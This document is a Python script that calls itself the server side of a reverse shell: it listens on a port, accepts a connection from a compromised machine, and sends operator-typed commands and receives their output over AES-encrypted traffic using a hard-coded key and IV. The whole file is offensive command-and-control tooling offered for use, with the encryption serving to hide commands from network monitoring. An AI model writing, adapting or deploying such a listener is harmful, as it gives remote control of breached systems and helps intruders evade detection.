#!/usr/bin/env python3
import os
import socket
import argparse
from Crypto.Cipher import AES

aes_key = '8ZT%a*SJxTD*f6#8C6BfpHmf#DcE5^qH'
aes_iv = 'sPqapxT*4vZXjZ$w'
aes_bs = 64

parser = argparse.ArgumentParser(description="Python reverse shell server-side")
parser.add_argument('--host', help='IP address to bind to', metavar='IP', default='0.0.0.0')
parser.add_argument('--port', help='Port to bind to', metavar='PORT', default='1776')

args = parser.parse_args()

bind_host = args.host
host_port = args.port

def server(port):
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serversocket.bind((bind_host, int(host_port)))
    serversocket.listen(5) # become a server socket, maximum 5 connections
    return(serversocket)

def bit_pad(bs, message):
    return(message + (bs - len(message) % bs) * chr(bs - len(message) % bs))

def bit_unpad(ciphertext):
    return(ciphertext[:-ord(ciphertext[len(ciphertext)-1:])])

def do_encrypt(key, iv, bs, message):
    message = bit_pad(bs, message)
    obj = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = obj.encrypt(message)
    return(ciphertext)

def do_decrypt(key, iv, ciphertext):
    obj2 = AES.new(key, AES.MODE_CBC, iv)
    message = obj2.decrypt(ciphertext)
    message = bit_unpad(message).decode('utf-8')
    return(message)

def receive(key, iv, serversocket):
    global connection
    connection, address = serversocket.accept()
    buf = connection.recv(64)
    if len(buf) > 0:
        message = do_decrypt(key, iv, buf)
        print(message)

def rev_shell(key, iv, bs, connection):
    while True:
        command = input('$ ')
        if command == 'clear':
            os.system('clear')
        elif command == 'exit':
            break
        command = do_encrypt(key, iv, bs, command)
        connection.send(command)
        data = connection.recv(2048)
        if len(data) > 0:
            message = do_decrypt(key, iv, data)
            print(message)


def main(port, key, iv, bs):
    serversocket = server(port)
    try:
        while True:
            receive(key, iv, serversocket)
            rev_shell(key, iv, bs, connection)
    except KeyboardInterrupt:
        print('Interrupted')

if __name__ == '__main__':
    main(host_port, aes_key, aes_iv, aes_bs)
